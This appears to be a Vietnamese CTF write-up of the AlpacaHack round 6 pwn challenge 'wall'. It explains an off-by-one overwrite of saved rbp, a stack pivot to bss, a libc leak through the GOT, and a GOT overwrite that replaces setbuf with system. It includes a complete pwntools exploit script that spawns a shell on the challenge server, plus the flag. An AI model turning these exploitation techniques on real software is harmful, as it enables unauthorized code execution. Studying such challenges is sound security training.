---
title: AplacaHack pwn round6
date: 2025-03-06 00:00:00 +0800
categories: [writeup]
tags: [pwn,pivot]
author: "kuvee"
layout: post
toc: true 
---


## wall


- bài này mình không làm được trong lúc diễn ra giải nên hôm nay mình sẽ làm lại 

checksec : 

![image](https://hackmd.io/_uploads/B1kHRZqv1l.png)

- main : ta được nhập 4096 byte vào ```message``` , ```message``` ở đây là 1 biến toàn cục



```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  setbuf(stderr, 0LL);
  printf("Message: ");
  __isoc99_scanf("%4096[^\n]%*c", &message);
  get_name("%4096[^\n]%*c");
  return 0;
}
```

- get_name : ở đây ta thấy có 1 lỗi ```one_off_byte``` , scanf sẽ thêm byte NULL vào cuối và ghi đè 1 byte rbp của ```get_name```

```C
int __fastcall get_name(const char *a1)
{
  char v2[128]; // [rsp+0h] [rbp-80h] BYREF

  printf("What is your name? ");
  __isoc99_scanf("%128[^\n]%*c", v2);
  return printf("Message from %s: \"%s\"\n", v2, message);
}
```


- ở đây ta có thể thấy nếu may mắn , ```0x7fffffffd840``` là rbp của hàm ```get_name``` đang trỏ đến ```0x7fffffffd800``` là rbp của hàm main và lúc này nó đã bị ghi đè 1 byte và có nghĩa là khi kết thúc hàm main nó sẽ nhảy đến ```0x7fffffffd808``` và đó cũng chính là dữ liệu ta nhập vào 

![image](https://hackmd.io/_uploads/SJhmgMcD1g.png)

- ở bài này không có hàm win hay gì cả , vì vậy trước hết có lẽ là ta cần suy nghĩ leak libc trước , vì phiên bản libc này khá cao nên không còn các gadget như ```pop rdi``` nữa , vì vậy ta phải quay về chương trình của ta kiếm các gadget : 

- ở đây ta thấy nó sẽ ```lea rax,[rbp-0x80]``` các kiểu và ```rax``` sẽ được mov vào ```rsi``` , vậy có nghĩa ta hoàn toàn có thể nhờ đoạn này để leak chỉ cần ta điều khiển được ```rbp``` , và chắc chắn ```rbp``` ở đây sẽ là 1 địa chỉ got 
![image](https://hackmd.io/_uploads/B1LjOG9Dyx.png)

- tuy nhiên khi leak xong thì stack lúc này sẽ là 1 địa chỉ exe , có lẽ giải pháp dự định của tác giả cũng chính là điều này , ta hãy nhớ lại ta có thể nhập dữ liệu vào 1 biến global , vậy kết hợp các điều này với nhau ta có thể tạo thêm 1 chuỗi ```rop``` nữa : 

- một lần nữa nếu ta điều khiển được ```rbp``` thì ta hoàn toàn có thể dùng scanf để ghi đè bất cứ dữ liệu nào có thể ghi được , ở đây ta sẽ chọn ```setbuf``` vì nó chỉ có 1 đối số , ta sẽ truyền ```/bin/sh\x00``` vào thay cho ```stderr```
![image](https://hackmd.io/_uploads/By_29fcD1l.png)

- đoạn rop để leak libc sẽ như sau : 

ta sẽ cho vào các ret để tránh khi ghi đè ```rbp``` thì nó sẽ trỏ đến đúng chuỗi rop (tăng khả năng rop)

```coffeescript
ret
ret
ret
...
pop rbp,ret
got_setbuf
địa chỉ rop leak
```

- đoạn overwrite GOT : 

```css
ret
ret
ret
ret
...
pop_rbp,ret
địa chỉ overwrite scanf
```

- payload overwrite GOT :
![image](https://hackmd.io/_uploads/BkINnfcDkl.png)

```csharp
system : no sẽ thay thế setbuf got
main : overwrite got của printf thành main để nó quay về thực thi setbuf get_shell
0*6
stdout_libc + 0
stdin_libc + 0
/bin/sh\x00
```

script 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./wall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

#p = process()
p = remote('34.170.146.252', 18345)
#gdb.attach(p,gdbscript='''
#           b*0x0000000000401252
#           b*0x0000000000401257
#           b*0x00000000004011ac
#           ''')
input()

pop_rbp = 0x000000000040115d
rop_printf = 0x00000000004011b1
rop_scanf = 0x0000000000401196

setbuf_got = exe.got.setbuf

ret = 0x000000000040101a


rop_chain = p64(pop_rbp)
rop_chain += p64(setbuf_got+0x80)
rop_chain += p64(rop_scanf)

payload = p64(ret)*505 + rop_chain
#input()

rop_chain2 = p64(pop_rbp)
rop_chain2 += p64(setbuf_got+0x80)
rop_chain2 += p64(rop_printf)
payload2 = p64(ret)*13 + rop_chain2

p.sendlineafter(b'Message: ',payload)
p.sendlineafter(b'What is your name? ',payload2)

p.recvuntil(b'Message from ')
p.recvline()
p.recvuntil(b'Message from ')

leak_got_setbuf = u64(p.recv(6).ljust(8,b'\x00'))

libc.address = leak_got_setbuf  - libc.sym.setbuf
print("lb: ",hex(libc.address))

payload_get_shell = p64(libc.sym.system) + p64(exe.sym.main)
payload_get_shell += p64(0)*6
payload_get_shell += p64(libc.sym._IO_2_1_stdout_) + p64(0)
payload_get_shell += p64(libc.sym._IO_2_1_stdin_) + p64(0)
payload_get_shell += p64(next(libc.search(b'/bin/sh\x00')))

p.sendline(payload_get_shell)
p.sendline(b'ls')


p.interactive()
```


```Alpaca{p1v0T1ng_t0_Bss_i5_tR1cKy_du3_7o_st4Ck_s1Z3_Lim17}```


